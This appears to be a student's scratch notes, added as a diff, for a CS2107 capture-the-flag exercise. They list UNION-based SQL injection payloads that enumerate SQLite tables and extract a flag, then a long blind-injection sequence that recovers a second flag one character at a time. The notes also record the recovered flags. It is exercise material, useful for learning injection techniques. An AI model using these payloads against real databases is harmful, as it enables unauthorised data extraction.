@@ -1,0 +1,68 @@
+master key: ' union select id,(select id from facts) as x from facts where id = 2 order by id desc limit 1  --'
+table names: facts, flags
+flag: CS2107{SqL_iNj3cT10N_1s_qU1t3_e4sY!}
+query to get flag:' union select id,(select flag from flags) as x from facts where id = 2 order by id desc limit 1  --'
+
+test1: ' union select id,(select sqlite_version()) as x from facts where id = 2 order by id desc limit 1  --'
+test2: ' union select id,(SELECT sql FROM sqlite_schema) as x from facts where id = 2 order by id desc limit 1  --'
+get table name: ' union select id,(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%') as x from facts where id = 2 order by id desc limit 1  --'
+get colum name: ' union select id,(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='flags') as x from facts where id = 2 order by id desc limit 1  --'
+
+
+EXTENDED FOR MEDIUM CHALLENGE: BLIND SQL CHALLENGE-> we need to brute force the context of flag: length and content
+current flag = bL1nd_1s_n0t_4_Pr0BL3m_f0R_ThE_m1gHtY_Sqli_mASTeR
+iguana' union select id,(select flag from flags) as x from cat_breeds where length(x) = 57 order by id desc limit 1  --' is correct
+VERIFY -> iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,1,7) = "CS2107{"  order by id desc limit 1  --'
+       ->iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,-1,1) = "}"  order by id desc limit 1  --'
+BRUTE FORCE -> we left 57 - 8 = 49 characters
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,8,1) BETWEEN 'a' and 'z'  order by id desc limit 1  --' correct
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,8,1) BETWEEN 'b' and 'b'  order by id desc limit 1  --' correct, i gueesed b cause this flag is probably blind injection sth
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,9,1) BETWEEN 'L' and 'L'  order by id desc limit 1  --' correct
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,10,1) = '1'  order by id desc limit 1  --' correct
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,11,1) = 'n'  order by id desc limit 1  --' correct
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,12,1) = 'd'  order by id desc limit 1  --' correct
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,13,1) BETWEEN char(95) and char(95)  order by id desc limit 1  --' correct
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,14,1) = '1'  order by id desc limit 1  --' correct
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,15,1) BETWEEN char(115) and char(115)  order by id desc limit 1  --' correct
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,16,1) BETWEEN char(95) and char(95)  order by id desc limit 1  --' correct
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,17,1) BETWEEN char(110) and char(110)  order by id desc limit 1  --' correct
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,18,1) BETWEEN char(48) and char(48)  order by id desc limit 1  --' correct
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,19,1) = 't'  order by id desc limit 1  --' correct
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,20,1) = '_'  order by id desc limit 1  --' correct
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,21,1) BETWEEN char(52) and char(52)   order by id desc limit 1  --' correct
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,22,1) BETWEEN char(95) and char(95)   order by id desc limit 1  --' correct
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,23,1) BETWEEN char(80) and char(80)   order by id desc limit 1  --' correct
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,24,1) BETWEEN char(114) and char(114)   order by id desc limit 1  --' correct
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,25,1) BETWEEN char(48) and char(48)   order by id desc limit 1  --' correct
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,26,1) BETWEEN char(66) and char(66)   order by id desc limit 1  --' correct
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,27,1) BETWEEN char(76) and char(76)   order by id desc limit 1  --' correct
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,28,1) = '3'   order by id desc limit 1  --' correct
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,29,1) = 'm'   order by id desc limit 1  --' correct
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,30,1) = '_'   order by id desc limit 1  --' correct
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,31,1) BETWEEN char(102) and char(102)   order by id desc limit 1  --' correct
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,32,1) BETWEEN char(48) and char(48)   order by id desc limit 1  --' correct
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,33,1) BETWEEN char(82) and char(82)   order by id desc limit 1  --' correct
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,34,1) = '_'   order by id desc limit 1  --' correct
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,35,1) BETWEEN char(84) and char(84)   order by id desc limit 1  --'
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,36,1) BETWEEN char(104) and char(104)   order by id desc limit 1  --'
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,37,1) = 'E'   order by id desc limit 1  --'
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,38,1) = '_'   order by id desc limit 1  --'
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,39,1) BETWEEN char(109) and char(109) order by id desc limit 1  --'
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,40,1) BETWEEN char(49) and char(49) order by id desc limit 1  --'
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,41,1) BETWEEN char(103) and char(103) order by id desc limit 1  --'
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,42,1) BETWEEN char(72) and char(72) order by id desc limit 1  --'
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,43,1) = 't' order by id desc limit 1  --'
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,44,1) = 'Y' order by id desc limit 1  --'
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,45,1) = '_' order by id desc limit 1  --'
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,46,1)  BETWEEN char(83) and char(83) order by id desc limit 1  --'
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,47,1)  BETWEEN char(113) and char(113) order by id desc limit 1  --'
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,48,1) = 'l' order by id desc limit 1  --'
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,49,1) BETWEEN char(105) and char(105) order by id desc limit 1  --'
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,50,1) BETWEEN char(95) and char(95) order by id desc limit 1  --'
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,51,1) BETWEEN char(109) and char(109) order by id desc limit 1  --'
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,52,1) BETWEEN char(65) and char(65) order by id desc limit 1  --'
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,53,1) BETWEEN char(83) and char(83) order by id desc limit 1  --'
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,54,1) BETWEEN char(84) and char(84) order by id desc limit 1  --'
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,55,1) = 'e' order by id desc limit 1  --'
+iguana' union select id,(select flag from flags) as x from cat_breeds where substr(x,56,1) = 'R' order by id desc limit 1  --'
+iguana' union select id,(select flag from flags) as x from cat_breeds where x = 'CS2107{bL1nd_1s_n0t_4_Pr0BL3m_f0R_ThE_m1gHtY_Sqli_mASTeR}' order by id desc limit 1  --'
